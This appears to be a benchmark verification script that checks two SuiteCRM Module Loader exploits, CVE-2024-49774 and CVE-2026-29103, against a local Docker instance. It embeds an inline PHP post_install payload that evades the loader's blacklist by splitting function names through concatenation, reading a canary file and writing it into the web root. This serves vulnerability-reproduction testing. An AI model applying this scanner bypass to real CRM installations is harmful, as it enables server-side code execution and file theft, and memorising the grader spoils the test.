#!/usr/bin/env bash
# verify.sh --seed|--residual
# 0 = Module Loader post_execute wrote RUN_FLAG to the web-root marker
# 10 = scanner blocked / no flag   20 = env   30 = args
#
# Seed: quoted-string callable 'file_get_contents'(...)  (CVE-2024-49774)
# Residual (inline): concatenation ('file_get'.'_contents')(...)  (CVE-2026-29103)
# Both drive the REAL SuiteCRM Module Loader HTTP path. No heldout files.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
# Leftover Module Loader install from seed can crash a second upload
# (duplicate module / login). wrong/stale must reject without re-probing.
if [[ -n "${RUN_FLAG_REF:-}" && "$RUN_FLAG" != "$RUN_FLAG_REF" ]]; then
  echo "status=rejected(wrong/stale flag)"
  exit 10
fi
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

SVC="$VERSION"
PORT=""
for i in $(seq 1 45); do
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
    port "$SVC" 80 2>/dev/null | sed 's/.*://' | tr -d '[:space:]' || true)"
  if [[ -n "$PORT" ]]; then
    body="$(curl -sS -m 5 "http://127.0.0.1:${PORT}/index.php?module=Users&action=Login" || true)"
    if printf '%s' "$body" | grep -q 'user_name'; then
      break
    fi
  fi
  if [[ $((i % 8)) -eq 0 ]]; then
    docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" up -d >/dev/null 2>&1 || true
  fi
  sleep 2
  PORT=""
done
[[ -n "$PORT" ]] || { echo "verify: no published ${SVC}:80 / SuiteCRM login not ready" >&2; exit 20; }
export PCB_TARGET_PORT="$PORT"
export PCB_FLAG="${PCB_FLAG:-$RUN_FLAG}"

if [[ "$MODE" == "--seed" ]]; then
  "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json" || { echo "verify: original_poc failed" >&2; exit 20; }
else
  # residual CVE-2026-29103: same Module Loader upload + post_execute sink;
  # only the PHP spelling changes (concat splits the blacklisted token).
  # Inline literals only; never reference heldout files.
  "$PY" - "$WORK_DIR/cand.json" <<'PY'
import json, sys
open(sys.argv[1], "w").write(json.dumps({
    "probe_id": "cve-2026-29103-concat-callable",
    "kind": "concat",
    "module_name": "PCBBypass",
    "marker": "pcb_marker_bypass.txt",
    "post_install": "<?php\n$c = ('file_get'.'_contents')('/tmp/pcb_canary.txt');\n('file_put'.'_contents')('/var/www/html/pcb_marker_bypass.txt', $c);\n",
}) + "\n")
PY
fi

OUT=""
for _try in 1 2 3 4; do
  if OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION")"; then
    break
  fi
  echo "verify: seed_exec retry ${_try} (apache may be restarting)" >&2
  echo "$OUT" >&2
  sleep 8
  OUT=""
done
[[ -n "$OUT" ]] || { echo "verify: seed_exec failed after retries" >&2; exit 20; }
echo "$OUT" | head -c 500; echo
"$PY" -c "
import json, sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
body = str(d.get('body') or d.get('fetched_body') or '')
sys.exit(0 if sys.argv[2] in body else 10)
" "$OUT" "$RUN_FLAG"
